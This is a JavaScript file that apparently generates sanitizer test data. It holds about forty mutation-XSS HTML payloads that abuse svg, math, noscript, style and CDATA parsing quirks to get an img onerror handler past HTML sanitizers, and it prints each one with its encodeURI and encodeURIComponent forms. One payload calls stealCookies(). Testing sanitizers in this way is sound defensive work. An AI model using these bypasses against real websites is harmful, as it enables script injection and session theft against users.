
function fix_payload(payload) {
  payload = payload.replace(/\\/g, "\\\\");
  payload = payload.replace(/"/g, "\\\"");
  payload = payload.replace(/[\n\r]/g, "");
  return payload;
}

let payloads = [
  "<p><a href='http://example.com/' onclick='stealCookies()'>Link</a></p>",
  "<select><template><style><!--</style><a rel=\"--></style></template></select><img id=a src onerror=alert(1)>\">",
  "<form><math><mtext></form><form><mglyph><style></math><img id=a src onerror=alert(1)>",
  "<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img id=a src=1 onerror=alert(1)&amp;gt;",
  "<noscript><a title=\"</noscript><img id=a src=x onerror=alert(1)>\">",
  "<noscript><style></noscript><img id=a src=x onerror=alert(1)>",
  "<svg><style><img id=a src=x onerror=alert(1)></style></svg>",
  "<svg><style>/*</style><img id=a src onerror=alert(1)",
  "<svg><textarea></textarea><img id=a src onerror=alert(1)",
  "<style><mglyph><textarea title='<!--<!--</style><img id=a src=x onerror=mxss(1)></mtext><!---->-->'></mglyph></style>",
  "<div id='--!><style><!--</form><form id='<select><img id=a src=x onerror=mxss(1)></select>--!>'>--!>--!><!---->--!></style></style>'>",
  "<span><mglyph><span foo='<!--<keygen><math><style title='<a><img id=a src=x onerror=mxss(1)></a></noscript>'></math></keygen>-->'></mglyph><!--<style></span>--!>",
  "<a foo='<!--<span foo='/*<!--<select><img id=a src=x onerror=mxss(1)></select><br></mglyph>--><textarea>'>-->'>",
  "<textarea></noscript><mtext></textarea><!----!><img id=a src=x onerror=mxss(1)><input></select>/*--></mtext></mglyph>",
  "</span><form>/*<svg></p>/*<form></form><img id=a src=x onerror=mxss(1)><div></form></div></br>--!></svg><p></style></form>",
  "<form foo=<a id=<!--<mglyph title=/*<style><form><img id=a src=x onerror=mxss(1)></form></style>'>-->>><div>",
  "</form><math><style><img id=a src=x onerror=mxss(1)><math></style><style></math><div>",
  "<a id=/*<!--</div><img id=a src=x onerror=mxss(1)>-->><style>",
  "<mglyph></select><mglyph><svg><img id=a src=x onerror=mxss(1)></svg></mglyph><select></mglyph>",
  "<div><math>\"<br><a><a id='<!--</svg>--!><span id='<math><img id=a src=x onerror=mxss(1)></math>></style>--><!--'></a></br></math></div>",
  "<style id=<span><mtext><style data-foo=/*<input></a></style><mglyph><mtext title=<script>mxss(1)</script>'></input>\"></mtext></span>><!--\"",
  '<a id=<span><svg data-foo="<mglyph title="</style><style>&lt;select&gt;&lt;img id=a src=x onerror=mxss(1)&gt;&lt;div&gt;&lt;/select&gt;<keygen>"><p><!--></span></title></span>>',
  '<select><var><div foo=<!--</math><!--<iframe><select><keygen></mi><img id=a src=x onerror=mxss(1)></keygen></select></plaintext></iframe>--!></td><!--</xmp>--!>></select>',
  '<noembed>--!><select><iframe><mglyph><select><img id=a src=x onerror=mxss(1)></select></mglyph></iframe></select>/*</noembed>',
  '<svg><style id=<div><style><![CDATA[<!--<!--<style>--><img id=a src=x onerror=mxss(1)></pre>--!><ul><dl>]]><mo></style></div>>',
  '<var><svg></foreignobject><style></br><![CDATA[</plaintext>/*</ms><div>"<img id=a src=x onerror=mxss(1)></div><script>]]></style></br></svg></var>',
  `<svg title="<annotation-xml foo=<annotation-xml encoding="application/xhtml+xml">--><style title=''</annotation-xml>/*&lt;img id=a src=x onerror=mxss(1)&gt;"<noembed>''>--!>>">"`,
  `<svg><style foo=<noframes>-->&lt;img id=a src=x onerror=mxss(1)&gt;--&gt;&lt;!--]]></pre></xmp><annotation-xml encoding="application/xhtml+xml">">]]></svg><mglyph></dfn>`,
  `<noscript xmlns="http://www.w3.org/1998/Math/MathML"><a title=""></noscript><img id=a src=x onerror=alert(1)>">`,
  `<select><var><div foo=<!--</math><!--<iframe><select><keygen></mi><img src=x onerror=mxss(1)></keygen></select></plaintext></iframe>--!></td><!--</xmp>--!>></select>`,
  `<desc data-foo=<br><select><mglyph><iframe>/*<style>-->--!><keygen><img src=x onerror=mxss(1)><title></keygen></style></path><noembed><path></mglyph></br>>`,
  `<select>"</plaintext></listing><iframe><ms><ul><input title=<annotation-xml encoding="application/xhtml+xml"><input>--><annotation-xml encoding="application/xhtml+xml"><mtext><img src=x onerror=mxss(1)></mtext></annotation-xml></input></annotation-xml>></ms>/*</select>`,
  `<svg title="<annotation-xml foo=<annotation-xml encoding="application/xhtml+xml">--><style title=''</annotation-xml>/*&lt;img src=x onerror=mxss(1)&gt;"<noembed>''>--!>>">"`,
  `<select><keygen><iframe title=<table><mi><keygen>'<mglyph><img src=x onerror=mxss(1)>--!></mglyph></keygen>--!></mtext><var><pre></mi></table></xmp>></keygen></select>`,
  `<br/><hr><br><p></br></div><div> <!-- foo -->`,
    `<div><![CDATA[<img src=x onerror=mxss(1)]]>`,
    `<select><template><style><!--</style><a rel="--></style></template></select><img id=a src onerror=alert(1)>">`,
  `<style title='<ul>  <![CDATA[<!--<dfn><tr foo=<option><img src=x onerror=mxss(1)></option>></dfn>--!>]]> '</ul>'></path> '`,
  ` %3Cstyle%20data-foo="%3Cdl%20title='%3Coption%3E%3Cdesc%3E%3C/div%3E%3Cdiv%20title=%3C/select%3E%3`,
    `]]><plaintext id='<img src=x onerror=mxss(1)>">`
];

console.log(`let data = [`);
for (const payload of payloads) {
  let enc_uri = encodeURI(payload);
  let enc_uric = encodeURIComponent(payload);
  console.log(`\t("${fix_payload(payload)}", "${fix_payload(enc_uri)}", "${fix_payload(enc_uric)}");`);

}
console.log(`]`);
